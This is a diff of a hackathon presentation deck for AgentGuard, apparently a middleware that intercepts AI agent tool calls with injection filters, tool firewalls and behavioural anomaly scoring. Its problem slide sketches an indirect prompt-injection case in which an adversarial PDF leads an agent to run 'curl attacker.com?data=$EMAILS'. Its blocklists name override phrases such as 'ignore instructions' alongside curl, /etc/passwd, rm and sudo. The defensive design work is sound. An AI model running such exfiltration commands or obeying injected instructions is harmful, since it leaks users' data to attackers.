@@ -1,8 +1,6 @@
 # AgentGuard — Presentation Deck
 
-![AgentGuard Logo](assets/logo.png)
-
-**AI Unlocked 2026 · Track 5: Trustworthy AI · IIT Kharagpur · Team NamoFans**
+**AI Unlocked 2026 | Track 5: Trustworthy AI | IIT Kharagpur | Team NamoFans**
 
 | Animesh Raj | Atul Singh | Devansh Gupta | Prem Agarwal | Mohd Faizan Khan |
 |---|---|---|---|---|
@@ -10,365 +8,290 @@
 
 ---
 
-## Slide 1 — Problem Statement & Context
+## Slide 1 — Product Vision: What Are You Building Towards?
 
-### The Users
+### AgentGuard
 
-> **Enterprise security leads** and **ML platform engineers** deploying AI agents
-> in finance, healthcare, and SaaS — who need governance without rearchitecting.
+> **Making every AI agent trustworthy by default — a security middleware that intercepts, evaluates, and governs every action an AI agent takes, before it executes.**
 
----
+We are building the **Cloudflare WAF for AI agents** — a drop-in security layer that sits between AI agents and the real world. Just as web application firewalls made deploying web apps safe without rewriting them, AgentGuard makes deploying AI agents safe without rearchitecting them.
 
-### Three Converging Threats
-
-```
-╔══════════════════════╦═════════════════════════╦══════════════════════════╗
-║  🔴 REAL ATTACKS     ║  🔒 GOVERNANCE GAP       ║  📈 SCALING RISK         ║
-╠══════════════════════╬═════════════════════════╬══════════════════════════╣
-║  CVE-2025-32711      ║  75% of IT leaders cite  ║  40% of enterprise apps  ║
-║  EchoLeak CVSS 9.3   ║  security as #1 AI       ║  will use AI agents by   ║
-║  Zero-click data     ║  deployment blocker       ║  2026  (Gartner)         ║
-║  exfiltration via    ║                           ║                          ║
-║  M365 Copilot        ║  60% have NOT done an     ║  Each tool call =        ║
-║                      ║  AI risk assessment       ║  a new attack surface    ║
-║  CVE-2026-25253      ║  in the last 12 months    ║                          ║
-║  OpenClaw RCE 8.8    ║                           ║  OWASP Agentic Top 10:   ║
-║  One-click exploit   ║                           ║  10 distinct attack      ║
-║  on personal agents  ║                           ║  classes (2025)          ║
-╚══════════════════════╩═════════════════════════╩══════════════════════════╝
-```
+**The long-term vision:** Every enterprise AI agent ships with AgentGuard the way every website ships behind a WAF. One YAML config. One decorator. Full OWASP Agentic Top 10 coverage. Zero architecture changes.
 
 ---
 
-### Why Existing Tools Fail
+## Slide 2 — Problem Statement: What Are You Solving?
+
+### AI agents are deploying faster than security can follow
+
+**Who faces this problem:** Enterprise security leads and ML platform engineers deploying LLM-based agents in finance, healthcare, and SaaS — where a single unchecked tool call can exfiltrate data, execute malicious code, or violate compliance.
+
+**Why it matters now:**
 
 ```
-┌────────────────────────┬──────────────────────────┬────────────────────────────────┐
-│ Tool                   │ What it does             │ What it misses                 │
-├────────────────────────┼──────────────────────────┼────────────────────────────────┤
-│ Static content filters │ Keyword blocklist         │ Cannot evaluate tool-call args │
-│ API gateways           │ Rate limiting, auth       │ No semantic injection detection│
-│ RBAC-only tools        │ Role-based access         │ No behavioral baseline / HITL  │
-└────────────────────────┴──────────────────────────┴────────────────────────────────┘
+  REAL ATTACKS                    GOVERNANCE GAP                 SCALING RISK
+  ────────────────────            ────────────────────           ────────────────────
+  CVE-2025-32711 (CVSS 9.3)      75% of IT leaders cite         40% of enterprise apps
+  Zero-click data exfiltration    security as #1 AI deployment   will use AI agents by
+  via M365 Copilot (EchoLeak)    blocker (Gartner 2025)         2028 (Gartner)
+
+  CVE-2026-25253 (CVSS 8.8)      60% have NOT done an           OWASP Agentic Top 10:
+  One-click RCE on personal       AI risk assessment in the      10 distinct attack
+  AI agents (OpenClaw)            last 12 months                 classes (2025)
 ```
 
-**The gap:**  No existing solution intercepts and evaluates a tool call **before it executes**,
-with awareness of who called it, why, and whether its argument came from a malicious document.
+**The specific gap:** Existing tools (content filters, API gateways, RBAC) operate on individual inputs or outputs. None of them intercept a tool call **before execution** with awareness of who called it, what arguments it carries, whether those arguments came from a malicious document, and whether the agent's behavior over time is drifting toward exploitation.
 
-**Impact:** Adversarial PDF read by agent → `curl attacker.com?data=$EMAILS` → breach.
+**Concrete impact:** Adversarial PDF read by agent -> `curl attacker.com?data=$EMAILS` -> breach. No existing guardrail catches this because it spans input, tool call, and behavioral context.
 
 ---
 
-## Slide 2 — Solution Overview
+## Slide 3 — Your Solution: What Have You Built?
 
 ### AgentGuard = A WAF for Agentic Workflows
 
-```
-  CLOUDFLARE WAF                        AGENTGUARD
-  (protects web apps)                   (protects AI agents)
-
-  Internet                              User / Orchestrator
-      │                                         │
-      ▼                                         ▼
-  ┌──────────┐  intercept HTTP      ┌───────────────────────┐
-  │ WAF      │  before origin   vs  │ Guardian (4 layers)   │  intercept tool calls
-  └──────────┘                      └───────────────────────┘  before execution
-      │                                         │
-      ▼                                         ▼
-  Origin Server                           Tool / DB / API
-```
-
----
-
-### What It Delivers
+AgentGuard is an **in-process security middleware** that intercepts every input, tool call, and output flowing through an AI agent. It implements a **4-layer defense-in-depth** architecture:
 
 ```
-  Developer writes ONE decorator            Full 4-layer security stack fires
-  ─────────────────────────────    ──▶     ──────────────────────────────────
-  @guard_agent(config="ag.yaml")           L1  Input shielding (injection)
-  def run(user_message: str):              L2  Output PII + toxicity filter
-      return call_llm(user_message)        L3  Tool call firewall
-                                           L4  RBAC + Behavioral anomaly
-
-  No architecture changes. No new services. One YAML config.
+  Developer writes ONE decorator:           Full 4-layer security stack fires:
+  ──────────────────────────────   --->     ──────────────────────────────────
+  @guard_agent(config="ag.yaml")            L1  Input shielding (injection, jailbreak)
+  def run(user_message: str):               L2  Output PII + toxicity filter
+      return call_llm(user_message)         L3  Tool call firewall (5 guardrails + MELON)
+                                            L4  Adaptive PBAC + behavioral anomaly engine
 ```
 
----
+**Key idea:** Unlike Guardrails AI (validates what the model *says*), AgentGuard validates what the agent *does* — intercepting the tool call itself, its arguments, and the behavioral trajectory of the session.
 
-### Results at a Glance
+**Results at a Glance:**
 
 ```
   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
-  │  95 – 97.5%  │   │     96%      │   │    0.65 s    │   │     410      │
-  │  attack block│   │  CRITICAL    │   │  avg block   │   │  unit tests  │
-  │    rate      │   │  block rate  │   │  (offline)   │   │  0 failures  │
+  |  95 - 97.5%  |   |     96%      |   |    0.65 s    |   |     210      |
+  |  attack block|   |  CRITICAL    |   |  avg block   |   |  unit tests  |
+  |    rate      |   |  block rate  |   |  (offline)   |   |  0 failures  |
   └──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘
-   vs 7.5% unguarded   adversarial suite   no API needed
+   vs 7.5% unguarded   adversarial suite   no API needed     full coverage
 ```
-
-**Live demo →** https://agentguard.exempl4r.xyz/
 
 ---
 
-## Slide 3 — Key Features & User Flow
+## Slide 4 — Product Walkthrough: How It Works
 
-### End-to-End Security Pipeline
+### User Flow: Input -> 4 Layers -> Safe Output
 
 ```
   User Input
-      │
-      ▼
-  ╔═══════════════════════════════════════════════════════╗
-  ║  L1  INPUT SHIELD                                     ║
-  ║                                                       ║
-  ║  Tier 0  Exact blocklist    < 0.1 ms   FREE  ──┐     ║
-  ║  Tier 1  33-pattern regex     < 1 ms   FREE  ──┼──▶ BLOCK (no API call)
-  ║  Tier 2  Azure Prompt Shields  ~50 ms   $$$  ──┘     ║
-  ║                                                       ║
-  ║  Catches: SYSTEM OVERRIDE · ignore instructions      ║
-  ║           curl · /etc/passwd · jailbreak patterns    ║
-  ╚═══════════════════════════════════════════════════════╝
-      │  (only clean inputs reach the agent)
-      ▼
-  Agent Logic Runs
-      │
-      ▼  (every tool call intercepted before execution)
-  ╔═══════════════════════════════════════════════════════╗
-  ║  L4  RBAC + BEHAVIORAL  (in-process, zero API cost)   ║
-  ║                                                       ║
-  ║  ABAC:  role × verb × resource sensitivity × risk     ║
-  ║  Outcome:  ALLOW │ DENY │ ELEVATE → human approval    ║
-  ║                                                       ║
-  ║  Behavioral:  Z-score · Levenshtein · read→exfil      ║
-  ║               chain detection · entropy analysis      ║
-  ╚═══════════════════════════════════════════════════════╝
-      │
-      ▼
-  ╔═══════════════════════════════════════════════════════╗
-  ║  L3  TOOL FIREWALL                                    ║
-  ║                                                       ║
-  ║  file_system  │ no .env/.pem, path allowlist          ║
-  ║  sql_query    │ SELECT only — no DROP/DELETE/UPDATE   ║
-  ║  shell_cmds   │ blocklist: rm curl bash sudo eval     ║
-  ║  http_get/post│ domain allowlist, HTTPS, no 169.254.x ║
-  ║                                                       ║
-  ║  + C1 Azure entity recog on args                      ║
-  ║  + C2 MELON hybrid check (embedding + LLM judge)      ║
-  ║  + C4 HITL / AITL approval workflow                   ║
-  ╚═══════════════════════════════════════════════════════╝
-      │
-      ▼  (agent response)
-  ╔═══════════════════════════════════════════════════════╗
-  ║  L2  OUTPUT GUARDRAIL                                 ║
-  ║                                                       ║
-  ║  Azure AI Language → PII redaction (SSN, keys, email) ║
-  ║  Azure Content Safety → Toxicity filter               ║
-  ╚═══════════════════════════════════════════════════════╝
-      │
-      ▼
-  Safe Response → User
+      |
+      v
+  [L1 INPUT SHIELD]
+      Tier 0: Exact blocklist match           < 0.1 ms   FREE
+      Tier 1: 33-pattern regex pre-filter      < 1 ms    FREE
+      Tier 2: Azure AI Prompt Shields          ~50 ms    Azure
+      --> Catches: "ignore instructions", jailbreaks, code injection
+      |
+      v  (only clean inputs reach the agent)
+  Agent Logic Runs -> LLM generates tool calls
+      |
+      v  (every tool call intercepted BEFORE execution)
+  [L4 ADAPTIVE ENGINE]   <-- NEW: replaces static ABAC
+      L4a: PBAC Policy Engine (YAML policies, hot-reloadable, <2ms)
+           -> ALLOW | DENY | ELEVATE
+      L4b: 3 behavioral sub-scorers (async, isolated):
+           1. HalfSpaceTrees anomaly (per-role, online learning)
+           2. Session graph + IOA pattern matching (NetworkX)
+           3. Compliance drift monitor (sensitivity trajectory)
+           -> Fused risk_score: DENY >= 0.90, ELEVATE >= 0.70
+      |
+      v
+  [L3 TOOL FIREWALL]
+      file_system  | path allowlist, deny .env/.pem
+      sql_query    | SELECT only, deny DROP/DELETE/UPDATE
+      shell_cmds   | deny rm, curl, bash, sudo, eval
+      http_post    | domain allowlist, HTTPS required
+      + C2 MELON hybrid (embedding pre-filter + LLM judge)
+      + C4 HITL / AITL approval workflow
+      |
+      v  (agent response)
+  [L2 OUTPUT GUARDRAIL]
+      Azure AI Language -> PII redaction (SSN, keys, email)
+      Azure Content Safety -> Toxicity filter
+      |
+      v
+  Safe Response -> User
+```
+
+### Developer Experience
+
+```
+  Step 1               Step 2              Step 3             Step 4
+  agentguard init  ->  Fill .env       ->  @guard_agent   ->  agentguard test
+  Generates YAML       (Azure keys)        One decorator      25+ adversarial
+  + .env.example                           wraps any agent    scenarios (Promptfoo)
+```
+
+**Live Dashboard:** [agentguard.exempl4r.xyz](https://agentguard.exempl4r.xyz/) -- Real-time OTel traces, per-layer block counts, audit log, guarded vs. unguarded demo playground.
+
+---
+
+## Slide 5 — Key Features: What Makes It Strong
+
+### 1. Adaptive Behavioral Anomaly Detection (L4b)
+
+Unlike static rule-based systems, L4b uses **online machine learning** (River HalfSpaceTrees) that learns per-role behavioral baselines from the first tool call. It detects:
+- **Sensitivity escalation** (CPF S7): progressive access to increasingly sensitive resources over a session
+- **IOA pattern matching**: known attack sequences (credential harvesting, recon+exfil, privilege escalation) detected via session graph analysis
+- **Cold-start resilience**: shared global model delegates to per-role models after 50 calls
+
+### 2. Context-Isolated Monitor (CPF S11.2)
+
+L4b receives **only hashed metadata** (TelemetrySpan) — never raw tool arguments or LLM messages. This prevents the behavioral monitor from being compromised by the same adversarial context that attacks the agent itself.
+
+### 3. Hot-Reloadable YAML Policies (L4a)
+
+Security policies are defined in `l4_policies.yaml`, not hardcoded. Supports wildcards, condition operators (eq/gte/lte/in/not_in), and hot-reload without restart. First-match-wins evaluation with configurable default-deny.
+
+### 4. Tiered Cost Optimization (L1)
+
+Offline regex pre-filter blocks 40-60% of attacks for free (<1ms). Azure API is called only for ambiguous inputs. This reduces Azure API costs by 40-60% while maintaining 95-97.5% block rate.
+
+### 5. PyPI-Ready Package with Optional Extras
+
+```bash
+pip install agentguard                    # core only (10 deps)
+pip install agentguard[dashboard]         # + FastAPI, uvicorn, SSE
+pip install agentguard[testing]           # + deepteam, litellm
+pip install agentguard[all]               # everything
 ```
 
 ---
 
-### Developer Experience — 4 Steps
-
-```
-  Step 1                Step 2               Step 3              Step 4
-  ──────────────        ──────────────        ──────────────      ──────────────
-  agentguard init   →   Fill .env        →   @guard_agent    →   agentguard test
-  Generates             (Azure API keys)      One decorator       25+ adversarial
-  agentguard.yaml                            wraps any agent     scenarios via
-  + .env.example                                                  Promptfoo
-```
-
-**Dashboard** https://agentguard.exempl4r.xyz/
-- `/` — Real-time OTel trace stream, layer breakdown, audit log
-- `/demo` — Guarded vs. Unguarded toggle, pre-built attacks, custom prompts
-
----
-
-## Slide 4 — Architecture & Technology Approach
+## Slide 6 — Architecture & Tech Stack: How You Built It
 
 ### System Architecture
 
 ```
   ┌─────────────────────────────────────────────────────────────────────┐
-  │                          AGENTGUARD                                 │
-  │                                                                     │
-  │  ┌────────────────┐    ┌──────────────────┐    ┌─────────────────┐ │
-  │  │  Decorator     │    │   Guardian       │    │  Config Engine  │ │
-  │  │  Layer         │───▶│   (orchestrator) │◀───│  agentguard.yaml│ │
-  │  │                │    │                  │    │  agentguard init│ │
-  │  │  @guard_agent  │    │  routes to all   │    └─────────────────┘ │
-  │  │  @guard        │    │  layers in order │                         │
-  │  │  @guard_input  │    │                  │    ┌─────────────────┐ │
-  │  │                │    │  _notify_        │───▶│  Observability  │ │
-  │  │  GuardedTool   │    │  security_event()│    │                 │ │
-  │  │  Registry      │    │  (unified write) │    │ OTel → Jaeger   │ │
-  │  └────────────────┘    └──────┬───────────┘    │ SQLite audit log│ │
-  │                               │                └─────────────────┘ │
-  │              ┌────────────────┼─────────────┐                      │
-  │              ▼                ▼             ▼                       │
-  │  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐       │
-  │  │  L1 Input      │  │  L4 Engines    │  │  L3 Tool       │       │
-  │  │                │  │                │  │  Firewall      │       │
-  │  │  fast_inject   │  │ L4RBACEngine   │  │                │       │
-  │  │  prompt_shields│  │ Behavioral     │  │  5 guardrails  │       │
-  │  │  blocklists    │  │ AnomalyDetect  │  │  + C1/C2/C4   │       │
-  │  └────────────────┘  └────────────────┘  └────────────────┘       │
-  │                                                                     │
-  │  ┌────────────────┐                                                 │
-  │  │  L2 Output     │                                                 │
-  │  │  Azure PII     │                                                 │
-  │  │  + Toxicity    │                                                 │
-  │  └────────────────┘                                                 │
+  |                          AGENTGUARD                                 |
+  |                                                                     |
+  |  ┌────────────────┐    ┌──────────────────┐    ┌─────────────────┐ |
+  |  |  Decorator      |    |   Guardian       |    |  Config Engine  | |
+  |  |  Layer          |--->|   (orchestrator) |<---|  agentguard.yaml| |
+  |  |  @guard_agent   |    |  routes to all   |    |  l4_policies.   | |
+  |  |  @guard         |    |  layers in order |    |    yaml         | |
+  |  └────────────────┘    └──────┬───────────┘    └─────────────────┘ |
+  |                               |                                     |
+  |              ┌────────────────┼─────────────┐                      |
+  |              v                v             v                       |
+  |  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐       |
+  |  |  L1 Input      |  |  L4 Adaptive   |  |  L3 Tool       |       |
+  |  |  Shield        |  |  Engine        |  |  Firewall      |       |
+  |  |  fast_inject   |  | PolicyDecision |  |  5 guardrails  |       |
+  |  |  prompt_shields|  |  Point (PBAC)  |  |  + C1/C2/C4   |       |
+  |  |  blocklists    |  | L4Orchestrator |  └────────────────┘       |
+  |  └────────────────┘  |  Baseline(HST) |                           |
+  |                       |  SessionGraph  |  ┌────────────────┐       |
+  |  ┌────────────────┐  |  DriftMonitor  |  | Observability  |       |
+  |  |  L2 Output     |  └────────────────┘  | OTel -> Jaeger |       |
+  |  |  PII + Toxicity|                      | SQLite audit   |       |
+  |  └────────────────┘                      └────────────────┘       |
   └─────────────────────────────────────────────────────────────────────┘
-```
-
-### Data Flow
-
-```
-  str (user input)
-    → Guardian.validate_input()      [L1: fast path → Azure Prompt Shields]
-    → agent function executes
-    → Guardian.validate_tool_call()  [L4 RBAC → L3 firewall → C1/C4 → C2]
-      → tool.execute()               ← only if ALL checks pass
-    → Guardian.validate_output()     [L2: PII redact + toxicity]
-    → str (safe response)
 ```
 
 ### Technology Stack
 
 ```
-  ┌──────────────────────────┬─────────────────────────────────────────────────┐
-  │  Layer / Concern         │  Technology                                     │
-  ├──────────────────────────┼─────────────────────────────────────────────────┤
-  │  Language & packaging    │  Python 3.11+  ·  uv                            │
-  │  L1 injection detection  │  Azure AI Content Safety (Prompt Shields)       │
-  │                          │  + 33-pattern offline regex (free, <1ms)        │
-  │  L2 output safety        │  Azure AI Language (PII)                        │
-  │                          │  + Azure Content Safety (toxicity)              │
-  │  L3/L4 firewall + RBAC   │  Pure Python, in-process — zero external deps   │
-  │  Observability           │  OpenTelemetry → Jaeger  +  SQLite audit log    │
-  │  Red-team testing        │  Promptfoo (npx)  +  DeepTeam (OWASP Top 10)   │
-  │  LLM gateway             │  TrueFoundry (OpenAI-compatible)                │
-  │  Live dashboard          │  FastAPI  +  https://agentguard.exempl4r.xyz/   │
-  └──────────────────────────┴─────────────────────────────────────────────────┘
+  Layer / Concern            Technology
+  ─────────────────────────  ──────────────────────────────────────────────
+  Language & packaging       Python 3.11+ | uv | PyPI-ready (hatchling)
+  L1 injection detection     Azure AI Content Safety (Prompt Shields)
+                             + 33-pattern offline regex (free, <1ms)
+  L2 output safety           Azure AI Language (PII) + Content Safety (toxicity)
+  L3 tool firewall           Pure Python rule-based (sqlparse, ipaddress)
+                             + C2 MELON hybrid (embedding + LLM judge)
+  L4a policy engine          YAML-driven PBAC (hot-reloadable, first-match-wins)
+  L4b behavioral scoring     River HalfSpaceTrees (online ML, per-role)
+                             NetworkX session graph + IOA pattern matching
+                             NumPy Pearson correlation (drift monitor)
+  Observability              OpenTelemetry -> Jaeger + SQLite audit log
+  Red-team testing           Promptfoo (npx) + DeepTeam (OWASP Top 10)
+  LLM gateway                TrueFoundry (OpenAI-compatible)
+  Live dashboard             FastAPI + agentguard.exempl4r.xyz
 ```
+
+### Azure Services Used
+
+| Service | Layer | Purpose |
+|---|---|---|
+| Azure AI Content Safety | L1 | Prompt Shields, content filters, custom blocklists |
+| Azure AI Language | L2, C1 | PII detection, named entity recognition on tool args |
+| Azure Container Apps | Deploy | Live dashboard hosting |
 
 ---
 
-## Slide 5 — Design Decisions & Trade-offs
+## Slide 7 — AI Integration & Enhancements
 
-### Decision Matrix
+### Where and How AI Is Used
 
-```
-  ┌──────────────────────────┬──────────────────────────────┬────────────────────────────┐
-  │  Decision                │  What & Why                  │  Trade-off / Alternative   │
-  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
-  │  L2: Azure, not          │  Azure AI Language + Content  │  Guardrails AI covers same │
-  │  Guardrails AI           │  Safety already required for  │  PII/toxicity but adds a   │
-  │  (deferred)              │  L1; native trust boundary,   │  second model + dependency.│
-  │                          │  one less external dep.       │  Deferred as future plugin.│
-  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
-  │  Tiered L1               │  Tier 0/1 (offline regex)     │  Sending all inputs to     │
-  │  (offline first)         │  fires before any Azure call. │  Azure = slower + costly.  │
-  │                          │  ~40–60% blocked for free.    │  Regex misses novel attacks │
-  │                          │  Azure only for ambiguous.    │  → Tier 2 catches those.   │
-  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
-  │  ABAC + ELEVATE          │  ALLOW / DENY / ELEVATE →     │  Binary ALLOW/DENY is      │
-  │  (3rd outcome)           │  HITL approval. Novel outcome │  simpler but blocks valid  │
-  │                          │  not in Guardrails AI or MS   │  edge-cases. ELEVATE routes │
-  │                          │  Agent Governance Toolkit.    │  to human review instead.  │
-  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
-  │  MELON (C2) hybrid       │  Embedding pre-filter resolves │  Always-on = 2× LLM cost.  │
-  │                          │  ~80%; judge only if ambiguous.│  Enabled for medical /     │
-  │                          │  Enable in agentguard.yaml    │  financial agents only.    │
-  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
-  │  AITL: open-source       │  C4 supervisor uses fine-     │  Frontier LLMs (GPT-4o)    │
-  │  safety LLMs, not        │  tuned safety classifiers     │  add cost per ELEVATE,     │
-  │  frontier models         │  (Llama Guard 3, ShieldGemma, │  send tool args off-net,   │
-  │                          │  WildGuard, Granite Guardian) │  and are non-deterministic.│
-  │                          │  Self-hosted: data stays in-  │  Safety LLMs are purpose-  │
-  │                          │  network, <500ms, zero API    │  built for binary APPROVE/ │
-  │                          │  cost. Evaluated on Kaggle.   │  REJECT — not reasoning.   │
-  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
-  │  Dual observability      │  OTel for live SRE metrics.   │  Single store is simpler   │
-  │  (OTel + SQLite)         │  SQLite for compliance         │  but OTel is ephemeral;    │
-  │                          │  forensics — tamper-evident,  │  compliance audits need    │
-  │                          │  local, no cloud dependency.  │  a permanent local record. │
-  └──────────────────────────┴──────────────────────────────┴────────────────────────────┘
-```
+| AI Technique | Component | Why It's the Right Choice |
+|---|---|---|
+| **Online ML (HalfSpaceTrees)** | L4b Baseline | Learns from every tool call. No training data needed. Solves cold-start problem that broke the old Z-score approach. |
+| **Graph anomaly detection** | L4b Session Graph | Models agent sessions as directed graphs. Detects multi-step attack chains (credential harvesting, recon+exfil) that point-in-time checks miss entirely. |
+| **Pearson correlation** | L4b Drift Monitor | Implements CPF S7 (autoregressive drift formalism). Detects slow-burn privilege escalation across a session — mathematically proven detectable via trajectory analysis. |
+| **LLM-as-judge** | C2 MELON, C4 AITL | Semantic injection detection where rules fail. Open-source safety LLMs (Llama Guard 3, Granite Guardian) for data privacy. |
+| **Embedding similarity** | C2 MELON pre-filter | Cosine similarity pre-filter resolves ~80% of cases without LLM call. Only ambiguous cases go to the judge. |
 
-### Complementary to Microsoft Agent Governance Toolkit
+### Enhancements Since Phase 1
 
-```
-  AgentGuard (LLM attack surface)          MS Agent Governance Toolkit (execution env)
-  ─────────────────────────────────        ──────────────────────────────────────────────
-  ● Prompt injection (L1)                  ● Cryptographic agent identity
-  ● PII / toxic output (L2)               ● OS-level sandboxing (Agent Hypervisor)
-  ● Tool call argument validation (L3)     ● SRE reliability (SLOs, error budgets)
-  ● Behavioral anomaly (L4b)  ◀──────────  ASI-10 behavioral = "in active development"
-                                           AgentGuard L4b fills that gap today.
-  Together: cover all 10 OWASP Agentic Top 10 risks.
-```
+| Phase | What Changed | Why |
+|---|---|---|
+| Phase 1 | Static ABAC matrix + Z-score behavioral | Hardcoded, no temporal context, cold-start failure |
+| Phase 3 | + MELON hybrid detection, sandbox, AITL | Tool-call-level injection detection, kernel isolation |
+| **Phase 5** | **L4 Adaptive Engine: PBAC + 3 behavioral sub-scorers** | **Hot-reloadable policies, online learning, graph-based IOA detection, drift monitoring. Grounded in CPF S7/S11.2 and SentinelAgent (arXiv:2505.24201).** |
+
+### Theoretical Grounding
+
+The L4 upgrade is grounded in two research contributions:
+- **CPF S7** (Canale 2026): Autoregressive drift — `P(comply_t | comply_{t-1}) >> P(comply_t | x)` — proves sensitivity escalation is detectable via trajectory, not just point-in-time checks
+- **CPF S11.2** (Canale 2026): External monitor independence — defense must be architecturally independent of the defended model. TelemetrySpan enforces this isolation boundary.
+- **SentinelAgent** (He et al. 2025, arXiv:2505.24201): Graph-based anomaly detection in multi-agent systems — node/edge/path scoring adapted for our session graph IOA matcher
 
 ---
 
-## Slide 6 — Current Status, Limitations & Next Steps
+## Slide 8 — Scalability, Challenges & What's Next
 
-### What Is Fully Working
+### Scalability
 
-```
-  ✅ IMPLEMENTED & TESTED
-  ─────────────────────────────────────────────────────────────────────────
-  L1  │ 33-pattern offline regex + Azure Prompt Shields + blocklists
-  L2  │ Azure AI Language PII detection + Azure Content Safety toxicity
-  L3  │ 5 tool guardrails (file/sql/shell/http_get/http_post)
-      │ + C1 entity recog + C2 MELON (opt-in) + C4 HITL/AITL workflow
-  L4  │ L4RBACEngine (ABAC, infer_verb, infer_sensitivity)
-      │ + BehavioralAnomalyDetector (5 signals)
-  ─────────────────────────────────────────────────────────────────────────
-  CLI       │ agentguard init · agentguard test · agentguard dashboard
-  Red-team  │ Promptfoo (25+ attack scenarios) + DeepTeam (OWASP Top 10)
-  AITL eval │ notebooks/llm_as_a_judge_eval.ipynb — 6 open-source safety LLM candidates on Kaggle GPU
-  Audit     │ SQLite compliance log + OpenTelemetry → Jaeger
-  Dashboard │ https://agentguard.exempl4r.xyz/ (live, deployed)
-  Tests     │ 410 unit tests · 0 failures
-```
+- **PyPI package with optional extras**: `pip install agentguard` pulls only 12 core deps. Dashboard, testing, autogen are opt-in.
+- **Framework-agnostic**: Works with any Python agent framework (AutoGen, LangGraph, CrewAI) via decorator or programmatic API.
+- **L4a latency <2ms** (sync, in-process). **L4b latency <80ms** (async, acceptable for tool-call interception).
+- **Horizontal scaling**: Stateless Guardian instances behind a load balancer. Behavioral models persist to disk for warm restart.
 
-### Benchmark Results
+### Go-to-Market
+
+- **Open-source PyPI package** for developer adoption
+- **Enterprise tier**: Managed L4b behavioral models, centralized policy management, compliance dashboards
+- **Integration partners**: Azure AI Foundry marketplace, AutoGen ecosystem
+
+### Current Challenges
 
 ```
-  Adversarial comparison (40 tests each run):
-
-  Run 1                               Run 2
-  ───────────────────────────         ───────────────────────────
-  GuardedBot      97.5% secure        GuardedBot      95.0% secure
-  Unguarded       47.5% secure        Unguarded        7.5% secure
-  Improvement     +50.0 pp            Improvement     +87.5 pp
-
-  CRITICAL attack block rate: 96%     Fast-path avg: 0.65 s (offline tier)
+  Challenge                              Mitigation
+  ─────────────────────────────────────  ──────────────────────────────────────────
+  L4b HalfSpaceTrees slow at height=15   Reduced to height=8 default; configurable
+  Behavioral baselines need real traffic  Cold-start global model + warm restart via persist/load
+  AutoGen adapter not yet written        Dependency installed; adapter is a thin wrapper
+  Spotlighting requires Azure Foundry     Tier-1 regex covers common memory poisoning patterns
 ```
 
-### Known Limitations
+### Roadmap
 
 ```
-  ⚠  L4 behavioral baselines   Seeded with synthetic avg (5 req/min, std 2) — needs real traffic
-  ⚠  Redis caching              Config-stubbed, not wired — hot path is ~200 ms instead of <50 ms
-  ⚠  Spotlighting               Requires Azure AI Foundry endpoint — not available in prototype
-  ⚠  AutoGen / Magentic-One     Dependency installed; adapter code not written
-```
-
-### Next Steps (with Mentorship)
-
-```
-  1  Per-agent behavioral baselines via OTel telemetry → ClickHouse time-series
-  2  SPIFFE/SVID cryptographic agent identity (pairs with MS Agent Governance Toolkit)
-  3  Redis caching: sub-50 ms hot path vs current 200 ms
-  4  Guardrails AI as optional L2 plugin for orgs already running it
-  5  AutoGen / Magentic-One adapters for zero-code adoption
+  Q2 2026  Per-agent behavioral baselines via OTel -> ClickHouse time-series
+  Q2 2026  SPIFFE/SVID cryptographic agent identity (pairs with MS Agent Governance Toolkit)
+  Q3 2026  AutoGen / Magentic-One adapters for zero-code adoption
+  Q3 2026  Guardrails AI as optional L2 plugin
+  Q4 2026  Automated IOA pattern learning from historical attack data
 ```
 
 ---
@@ -377,11 +300,11 @@ with awareness of who called it, why, and whether its argument came from a malic
 
 | # | Citation |
 |---|---|
-| 1 | SentinelAgent, arXiv:2505.24201 (May 2025) — graph-based MAS anomaly detection |
-| 2 | aembit.io, Jan 2026 — 7 signal types for non-human identity behavioral monitoring |
-| 3 | Lee & Xiang, IEEE S&P 2001 — Shannon entropy for anomaly detection (foundational) |
-| 4 | Greshake et al., arXiv:2302.12173 — indirect prompt injection attacks |
-| 5 | OWASP Top 10 for LLM Applications 2025 |
-| 6 | microsoft/agent-governance-toolkit — OWASP Agentic Top 10; behavioral detection on roadmap |
-| 7 | CVE-2025-32711, EchoLeak (CVSS 9.3) — zero-click data exfiltration via M365 Copilot |
-| 8 | CVE-2026-25253, OpenClaw RCE (CVSS 8.8) — personal AI agent attack surface |
+| 1 | He et al., "SentinelAgent: Graph-based Anomaly Detection in LLM-based MAS", arXiv:2505.24201, May 2025 |
+| 2 | Canale, "Behind the Buzzwords: The Real Mechanics of LLM Security", CPF Technical Reference v1.0, Feb 2026 |
+| 3 | Tan et al., "Half-Space Trees for streaming anomaly detection", ICDM 2011 |
+| 4 | OWASP Top 10 for Agentic AI Applications, 2025 |
+| 5 | Microsoft Agent Governance Toolkit — OWASP Agentic Top 10 compliance |
+| 6 | CVE-2025-32711, EchoLeak (CVSS 9.3) — zero-click data exfiltration via M365 Copilot |
+| 7 | CVE-2026-25253, OpenClaw RCE (CVSS 8.8) — personal AI agent attack surface |
+| 8 | aembit.io, Jan 2026 — 7 signal types for non-human identity behavioral monitoring |
